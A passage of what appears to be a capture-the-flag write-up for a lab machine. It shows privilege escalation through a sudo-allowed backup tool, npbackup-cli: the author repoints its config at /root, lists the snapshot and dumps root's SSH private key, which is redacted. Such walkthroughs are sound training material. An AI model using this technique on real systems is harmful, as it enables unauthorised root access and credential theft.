+</pre> </div> <p><br> Update the config file to point to root.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-4127"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-4127')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-4127')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-4127')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-4127')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-4127">
+
+&lt;snip&gt;
+
+backup_opts:
+      paths:
+      - /root
+      source_type: folder_list
+      exclude_files_larger_than: 0.0
+
+&lt;snip&gt;
+
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-4127" onclick="terminalOverlayClose('bash-bash-4127')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-4127')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-4127')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-4127')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-4127" data-language="bash">
+
+&lt;snip&gt;
+
+backup_opts:
+      paths:
+      - /root
+      source_type: folder_list
+      exclude_files_larger_than: 0.0
+
+&lt;snip&gt;
+
+</pre> </div> </div> <p><br> Try running the back with the updated config file to see what happens.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-42511"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-42511')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-42511')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-42511')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-42511')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-42511">
+marco@codeparttwo:~$ sudo /usr/local/bin/npbackup-cli -c npbackupone.conf --backup
+2026-01-16 11:56:22,423 :: INFO :: npbackup 3.0.1-linux-UnknownBuildType-x64-legacy-public-3.8-i 2025032101 - Copyright (C) 2022-2025 NetInvent running as root
+2026-01-16 11:56:22,462 :: INFO :: Loaded config E1057128 in /home/marco/npbackupone.conf
+2026-01-16 11:56:22,478 :: INFO :: Searching for a backup newer than 1 day, 0:00:00 ago
+2026-01-16 11:56:25,057 :: INFO :: Snapshots listed successfully
+2026-01-16 11:56:25,059 :: INFO :: No recent backup found in repo default. Newest is from 2025-04-06 03:50:16.222832+00:00
+2026-01-16 11:56:25,059 :: INFO :: Runner took 2.58131 seconds for has_recent_snapshot
+2026-01-16 11:56:25,059 :: INFO :: Running backup of ['/root'] to repo default
+2026-01-16 11:56:26,286 :: INFO :: Trying to expanding exclude file path to /usr/local/bin/excludes/generic_excluded_extensions
+2026-01-16 11:56:26,287 :: ERROR :: Exclude file 'excludes/generic_excluded_extensions' not found
+2026-01-16 11:56:26,287 :: INFO :: Trying to expanding exclude file path to /usr/local/bin/excludes/generic_excludes
+2026-01-16 11:56:26,287 :: ERROR :: Exclude file 'excludes/generic_excludes' not found
+2026-01-16 11:56:26,287 :: INFO :: Trying to expanding exclude file path to /usr/local/bin/excludes/windows_excludes
+2026-01-16 11:56:26,288 :: ERROR :: Exclude file 'excludes/windows_excludes' not found
+2026-01-16 11:56:26,288 :: INFO :: Trying to expanding exclude file path to /usr/local/bin/excludes/linux_excludes
+2026-01-16 11:56:26,288 :: ERROR :: Exclude file 'excludes/linux_excludes' not found
+2026-01-16 11:56:26,288 :: WARNING :: Parameter --use-fs-snapshot was given, which is only compatible with Windows
+no parent snapshot found, will read all files
+
+Files:          15 new,     0 changed,     0 unmodified
+Dirs:            8 new,     0 changed,     0 unmodified
+Added to the repository: 190.612 KiB (39.886 KiB stored)
+
+processed 15 files, 197.660 KiB in 0:00
+snapshot 3bdb1df9 saved
+2026-01-16 11:56:27,691 :: INFO :: Backend finished with success
+2026-01-16 11:56:27,694 :: INFO :: Processed 197.7 KiB of data
+2026-01-16 11:56:27,695 :: ERROR :: Backup is smaller than configured minmium backup size
+2026-01-16 11:56:27,695 :: ERROR :: Operation finished with failure
+2026-01-16 11:56:27,696 :: INFO :: Runner took 5.219378 seconds for backup
+2026-01-16 11:56:27,696 :: INFO :: Operation finished
+2026-01-16 11:56:27,702 :: INFO :: ExecTime = 0:00:05.282347, finished, state is: errors.
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-42511" onclick="terminalOverlayClose('bash-bash-42511')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-42511')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-42511')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-42511')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-42511" data-language="bash">
+marco@codeparttwo:~$ sudo /usr/local/bin/npbackup-cli -c npbackupone.conf --backup
+2026-01-16 11:56:22,423 :: INFO :: npbackup 3.0.1-linux-UnknownBuildType-x64-legacy-public-3.8-i 2025032101 - Copyright (C) 2022-2025 NetInvent running as root
+2026-01-16 11:56:22,462 :: INFO :: Loaded config E1057128 in /home/marco/npbackupone.conf
+2026-01-16 11:56:22,478 :: INFO :: Searching for a backup newer than 1 day, 0:00:00 ago
+2026-01-16 11:56:25,057 :: INFO :: Snapshots listed successfully
+2026-01-16 11:56:25,059 :: INFO :: No recent backup found in repo default. Newest is from 2025-04-06 03:50:16.222832+00:00
+2026-01-16 11:56:25,059 :: INFO :: Runner took 2.58131 seconds for has_recent_snapshot
+2026-01-16 11:56:25,059 :: INFO :: Running backup of ['/root'] to repo default
+2026-01-16 11:56:26,286 :: INFO :: Trying to expanding exclude file path to /usr/local/bin/excludes/generic_excluded_extensions
+2026-01-16 11:56:26,287 :: ERROR :: Exclude file 'excludes/generic_excluded_extensions' not found
+2026-01-16 11:56:26,287 :: INFO :: Trying to expanding exclude file path to /usr/local/bin/excludes/generic_excludes
+2026-01-16 11:56:26,287 :: ERROR :: Exclude file 'excludes/generic_excludes' not found
+2026-01-16 11:56:26,287 :: INFO :: Trying to expanding exclude file path to /usr/local/bin/excludes/windows_excludes
+2026-01-16 11:56:26,288 :: ERROR :: Exclude file 'excludes/windows_excludes' not found
+2026-01-16 11:56:26,288 :: INFO :: Trying to expanding exclude file path to /usr/local/bin/excludes/linux_excludes
+2026-01-16 11:56:26,288 :: ERROR :: Exclude file 'excludes/linux_excludes' not found
+2026-01-16 11:56:26,288 :: WARNING :: Parameter --use-fs-snapshot was given, which is only compatible with Windows
+no parent snapshot found, will read all files
+
+Files:          15 new,     0 changed,     0 unmodified
+Dirs:            8 new,     0 changed,     0 unmodified
+Added to the repository: 190.612 KiB (39.886 KiB stored)
+
+processed 15 files, 197.660 KiB in 0:00
+snapshot 3bdb1df9 saved
+2026-01-16 11:56:27,691 :: INFO :: Backend finished with success
+2026-01-16 11:56:27,694 :: INFO :: Processed 197.7 KiB of data
+2026-01-16 11:56:27,695 :: ERROR :: Backup is smaller than configured minmium backup size
+2026-01-16 11:56:27,695 :: ERROR :: Operation finished with failure
+2026-01-16 11:56:27,696 :: INFO :: Runner took 5.219378 seconds for backup
+2026-01-16 11:56:27,696 :: INFO :: Operation finished
+2026-01-16 11:56:27,702 :: INFO :: ExecTime = 0:00:05.282347, finished, state is: errors.
+</pre> </div> </div> <p><br> Remove the minimum sizes and excludes to remove all the errors.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-42679"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-42679')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-42679')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-42679')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-42679')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-42679">
+conf_version: 3.0.1
+audience: public
+repos:
+  default:
+    repo_uri: 
+      __NPBACKUP__wd9051w9Y0p4ZYWmIxMqKHP81/phMlzIOYsL01M9Z7IxNzQzOTEwMDcxLjM5NjQ0Mg8PDw8PDw8PDw8PDw8PD6yVSCEXjl8/9rIqYrh8kIRhlKm4UPcem5kIIFPhSpDU+e+E__NPBACKUP__
+    repo_group: default_group
+    backup_opts:
+      paths:
+      - /root
+      source_type: folder_list
+      exclude_files_larger_than: 0.0
+    repo_opts:
+      repo_password: 
+        __NPBACKUP__v2zdDN21b0c7TSeUZlwezkPj3n8wlR9Cu1IJSMrSctoxNzQzOTEwMDcxLjM5NjcyNQ8PDw8PDw8PDw8PDw8PD0z8n8DrGuJ3ZVWJwhBl0GHtbaQ8lL3fB0M=__NPBACKUP__
+      retention_policy: {}
+      prune_max_unused: 0
+    prometheus: {}
+    env: {}
+    is_protected: false
+groups:
+  default_group:
+    backup_opts:
+      paths: []
+      source_type:
+      stdin_from_command:
+      stdin_filename:
+      tags: []
+      compression: auto
+      use_fs_snapshot: true
+      ignore_cloud_files: true
+      one_file_system: false
+      priority: low
+      exclude_caches: true
+      excludes_case_ignore: false
+      exclude_patterns: []
+      exclude_files_larger_than:
+      additional_parameters:
+      additional_backup_only_parameters:
+      pre_exec_commands: []
+      pre_exec_per_command_timeout: 3600
+      pre_exec_failure_is_fatal: false
+      post_exec_commands: []
+      post_exec_per_command_timeout: 3600
+      post_exec_failure_is_fatal: false
+      post_exec_execute_even_on_backup_error: true
+      post_backup_housekeeping_percent_chance: 0
+      post_backup_housekeeping_interval: 0
+    repo_opts:
+      repo_password:
+      repo_password_command:
+      minimum_backup_age: 1440
+      upload_speed: 800 Mib
+      download_speed: 0 Mib
+      backend_connections: 0
+      retention_policy:
+        last: 3
+        hourly: 72
+        daily: 30
+        weekly: 4
+        monthly: 12
+        yearly: 3
+        tags: []
+        keep_within: true
+        group_by_host: true
+        group_by_tags: true
+        group_by_paths: false
+        ntp_server:
+      prune_max_unused: 0 B
+      prune_max_repack_size:
+    prometheus:
+      backup_job: ${MACHINE_ID}
+      group: ${MACHINE_GROUP}
+    env:
+      env_variables: {}
+      encrypted_env_variables: {}
+    is_protected: false
+identity:
+  machine_id: ${HOSTNAME}__blw0
+  machine_group:
+global_prometheus:
+  metrics: false
+  instance: ${MACHINE_ID}
+  destination:
+  http_username:
+  http_password:
+  additional_labels: {}
+  no_cert_verify: false
+global_options:
+  auto_upgrade: false
+  auto_upgrade_percent_chance: 5
+  auto_upgrade_interval: 15
+  auto_upgrade_server_url:
+  auto_upgrade_server_username:
+  auto_upgrade_server_password:
+  auto_upgrade_host_identity: ${MACHINE_ID}
+  auto_upgrade_group: ${MACHINE_GROUP}
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-42679" onclick="terminalOverlayClose('bash-bash-42679')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-42679')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-42679')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-42679')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-42679" data-language="bash">
+conf_version: 3.0.1
+audience: public
+repos:
+  default:
+    repo_uri: 
+      __NPBACKUP__wd9051w9Y0p4ZYWmIxMqKHP81/phMlzIOYsL01M9Z7IxNzQzOTEwMDcxLjM5NjQ0Mg8PDw8PDw8PDw8PDw8PD6yVSCEXjl8/9rIqYrh8kIRhlKm4UPcem5kIIFPhSpDU+e+E__NPBACKUP__
+    repo_group: default_group
+    backup_opts:
+      paths:
+      - /root
+      source_type: folder_list
+      exclude_files_larger_than: 0.0
+    repo_opts:
+      repo_password: 
+        __NPBACKUP__v2zdDN21b0c7TSeUZlwezkPj3n8wlR9Cu1IJSMrSctoxNzQzOTEwMDcxLjM5NjcyNQ8PDw8PDw8PDw8PDw8PD0z8n8DrGuJ3ZVWJwhBl0GHtbaQ8lL3fB0M=__NPBACKUP__
+      retention_policy: {}
+      prune_max_unused: 0
+    prometheus: {}
+    env: {}
+    is_protected: false
+groups:
+  default_group:
+    backup_opts:
+      paths: []
+      source_type:
+      stdin_from_command:
+      stdin_filename:
+      tags: []
+      compression: auto
+      use_fs_snapshot: true
+      ignore_cloud_files: true
+      one_file_system: false
+      priority: low
+      exclude_caches: true
+      excludes_case_ignore: false
+      exclude_patterns: []
+      exclude_files_larger_than:
+      additional_parameters:
+      additional_backup_only_parameters:
+      pre_exec_commands: []
+      pre_exec_per_command_timeout: 3600
+      pre_exec_failure_is_fatal: false
+      post_exec_commands: []
+      post_exec_per_command_timeout: 3600
+      post_exec_failure_is_fatal: false
+      post_exec_execute_even_on_backup_error: true
+      post_backup_housekeeping_percent_chance: 0
+      post_backup_housekeeping_interval: 0
+    repo_opts:
+      repo_password:
+      repo_password_command:
+      minimum_backup_age: 1440
+      upload_speed: 800 Mib
+      download_speed: 0 Mib
+      backend_connections: 0
+      retention_policy:
+        last: 3
+        hourly: 72
+        daily: 30
+        weekly: 4
+        monthly: 12
+        yearly: 3
+        tags: []
+        keep_within: true
+        group_by_host: true
+        group_by_tags: true
+        group_by_paths: false
+        ntp_server:
+      prune_max_unused: 0 B
+      prune_max_repack_size:
+    prometheus:
+      backup_job: ${MACHINE_ID}
+      group: ${MACHINE_GROUP}
+    env:
+      env_variables: {}
+      encrypted_env_variables: {}
+    is_protected: false
+identity:
+  machine_id: ${HOSTNAME}__blw0
+  machine_group:
+global_prometheus:
+  metrics: false
+  instance: ${MACHINE_ID}
+  destination:
+  http_username:
+  http_password:
+  additional_labels: {}
+  no_cert_verify: false
+global_options:
+  auto_upgrade: false
+  auto_upgrade_percent_chance: 5
+  auto_upgrade_interval: 15
+  auto_upgrade_server_url:
+  auto_upgrade_server_username:
+  auto_upgrade_server_password:
+  auto_upgrade_host_identity: ${MACHINE_ID}
+  auto_upgrade_group: ${MACHINE_GROUP}
+</pre> </div> </div> <p><br> Run it again. Success!</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-41589"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-41589')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-41589')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-41589')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-41589')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-41589">
+marco@codeparttwo:~$ sudo /usr/local/bin/npbackup-cli -c npbackupone.conf --backup
+2026-01-16 12:00:20,778 :: INFO :: npbackup 3.0.1-linux-UnknownBuildType-x64-legacy-public-3.8-i 2025032101 - Copyright (C) 2022-2025 NetInvent running as root
+2026-01-16 12:00:20,814 :: INFO :: Loaded config A956ECA9 in /home/marco/npbackupone.conf
+2026-01-16 12:00:20,833 :: INFO :: Searching for a backup newer than 1 day, 0:00:00 ago
+2026-01-16 12:00:23,092 :: INFO :: Snapshots listed successfully
+2026-01-16 12:00:23,093 :: INFO :: No recent backup found in repo default. Newest is from 2025-04-06 03:50:16.222832+00:00
+2026-01-16 12:00:23,094 :: INFO :: Runner took 2.260862 seconds for has_recent_snapshot
+2026-01-16 12:00:23,094 :: INFO :: Running backup of ['/root'] to repo default
+2026-01-16 12:00:24,233 :: WARNING :: Parameter --use-fs-snapshot was given, which is only compatible with Windows
+no parent snapshot found, will read all files
+
+Files:          15 new,     0 changed,     0 unmodified
+Dirs:            8 new,     0 changed,     0 unmodified
+Added to the repository: 190.612 KiB (39.886 KiB stored)
+
+processed 15 files, 197.660 KiB in 0:00
+snapshot 41bf05ef saved
+2026-01-16 12:00:25,300 :: INFO :: Backend finished with success
+2026-01-16 12:00:25,302 :: INFO :: Processed 197.7 KiB of data
+2026-01-16 12:00:25,302 :: INFO :: Operation finished with success
+2026-01-16 12:00:25,303 :: INFO :: Runner took 4.471793 seconds for backup
+2026-01-16 12:00:25,303 :: INFO :: Operation finished
+2026-01-16 12:00:25,309 :: INFO :: ExecTime = 0:00:04.534965, finished, state is: warnings.
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-41589" onclick="terminalOverlayClose('bash-bash-41589')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-41589')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-41589')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-41589')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-41589" data-language="bash">
+marco@codeparttwo:~$ sudo /usr/local/bin/npbackup-cli -c npbackupone.conf --backup
+2026-01-16 12:00:20,778 :: INFO :: npbackup 3.0.1-linux-UnknownBuildType-x64-legacy-public-3.8-i 2025032101 - Copyright (C) 2022-2025 NetInvent running as root
+2026-01-16 12:00:20,814 :: INFO :: Loaded config A956ECA9 in /home/marco/npbackupone.conf
+2026-01-16 12:00:20,833 :: INFO :: Searching for a backup newer than 1 day, 0:00:00 ago
+2026-01-16 12:00:23,092 :: INFO :: Snapshots listed successfully
+2026-01-16 12:00:23,093 :: INFO :: No recent backup found in repo default. Newest is from 2025-04-06 03:50:16.222832+00:00
+2026-01-16 12:00:23,094 :: INFO :: Runner took 2.260862 seconds for has_recent_snapshot
+2026-01-16 12:00:23,094 :: INFO :: Running backup of ['/root'] to repo default
+2026-01-16 12:00:24,233 :: WARNING :: Parameter --use-fs-snapshot was given, which is only compatible with Windows
+no parent snapshot found, will read all files
+
+Files:          15 new,     0 changed,     0 unmodified
+Dirs:            8 new,     0 changed,     0 unmodified
+Added to the repository: 190.612 KiB (39.886 KiB stored)
+
+processed 15 files, 197.660 KiB in 0:00
+snapshot 41bf05ef saved
+2026-01-16 12:00:25,300 :: INFO :: Backend finished with success
+2026-01-16 12:00:25,302 :: INFO :: Processed 197.7 KiB of data
+2026-01-16 12:00:25,302 :: INFO :: Operation finished with success
+2026-01-16 12:00:25,303 :: INFO :: Runner took 4.471793 seconds for backup
+2026-01-16 12:00:25,303 :: INFO :: Operation finished
+2026-01-16 12:00:25,309 :: INFO :: ExecTime = 0:00:04.534965, finished, state is: warnings.
+</pre> </div> </div> <p><br> Run ls to view all the files in root.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-41393"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-41393')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-41393')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-41393')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-41393')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-41393">
+marco@codeparttwo:~$ sudo /usr/local/bin/npbackup-cli -c npbackupone.conf --ls
+2026-01-16 12:00:58,351 :: INFO :: npbackup 3.0.1-linux-UnknownBuildType-x64-legacy-public-3.8-i 2025032101 - Copyright (C) 2022-2025 NetInvent running as root
+2026-01-16 12:00:58,380 :: INFO :: Loaded config A956ECA9 in /home/marco/npbackupone.conf
+2026-01-16 12:00:58,391 :: INFO :: Showing content of snapshot latest in repo default
+2026-01-16 12:01:01,172 :: INFO :: Successfully listed snapshot latest content:
+snapshot 41bf05ef of [/root] at 2026-01-16 12:00:24.24741156 +0000 UTC by root@codeparttwo filtered by []:
+/root
+/root/.bash_history
+/root/.bashrc
+/root/.cache
+/root/.cache/motd.legal-displayed
+/root/.local
+/root/.local/share
+/root/.local/share/nano
+/root/.local/share/nano/search_history
+/root/.mysql_history
+/root/.profile
+/root/.python_history
+/root/.sqlite_history
+/root/.ssh
+/root/.ssh/authorized_keys
+/root/.ssh/id_rsa
+/root/.vim
+/root/.vim/.netrwhist
+/root/root.txt
+/root/scripts
+/root/scripts/backup.tar.gz
+/root/scripts/cleanup.sh
+/root/scripts/cleanup_conf.sh
+/root/scripts/cleanup_db.sh
+/root/scripts/cleanup_marco.sh
+/root/scripts/npbackup.conf
+/root/scripts/users.db
+
+2026-01-16 12:01:01,173 :: INFO :: Runner took 2.782473 seconds for ls
+2026-01-16 12:01:01,173 :: INFO :: Operation finished
+2026-01-16 12:01:01,181 :: INFO :: ExecTime = 0:00:02.833052, finished, state is: success.
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-41393" onclick="terminalOverlayClose('bash-bash-41393')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-41393')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-41393')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-41393')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-41393" data-language="bash">
+marco@codeparttwo:~$ sudo /usr/local/bin/npbackup-cli -c npbackupone.conf --ls
+2026-01-16 12:00:58,351 :: INFO :: npbackup 3.0.1-linux-UnknownBuildType-x64-legacy-public-3.8-i 2025032101 - Copyright (C) 2022-2025 NetInvent running as root
+2026-01-16 12:00:58,380 :: INFO :: Loaded config A956ECA9 in /home/marco/npbackupone.conf
+2026-01-16 12:00:58,391 :: INFO :: Showing content of snapshot latest in repo default
+2026-01-16 12:01:01,172 :: INFO :: Successfully listed snapshot latest content:
+snapshot 41bf05ef of [/root] at 2026-01-16 12:00:24.24741156 +0000 UTC by root@codeparttwo filtered by []:
+/root
+/root/.bash_history
+/root/.bashrc
+/root/.cache
+/root/.cache/motd.legal-displayed
+/root/.local
+/root/.local/share
+/root/.local/share/nano
+/root/.local/share/nano/search_history
+/root/.mysql_history
+/root/.profile
+/root/.python_history
+/root/.sqlite_history
+/root/.ssh
+/root/.ssh/authorized_keys
+/root/.ssh/id_rsa
+/root/.vim
+/root/.vim/.netrwhist
+/root/root.txt
+/root/scripts
+/root/scripts/backup.tar.gz
+/root/scripts/cleanup.sh
+/root/scripts/cleanup_conf.sh
+/root/scripts/cleanup_db.sh
+/root/scripts/cleanup_marco.sh
+/root/scripts/npbackup.conf
+/root/scripts/users.db
+
+2026-01-16 12:01:01,173 :: INFO :: Runner took 2.782473 seconds for ls
+2026-01-16 12:01:01,173 :: INFO :: Operation finished
+2026-01-16 12:01:01,181 :: INFO :: ExecTime = 0:00:02.833052, finished, state is: success.
+</pre> </div> </div> <p><br> Dump the id_rsa file.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-4111"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-4111')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-4111')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-4111')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-4111')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-4111">
+marco@codeparttwo:~$ sudo /usr/local/bin/npbackup-cli -c npbackupone.conf --dump /root/.ssh/id_rsa
+&lt;redacted&gt;
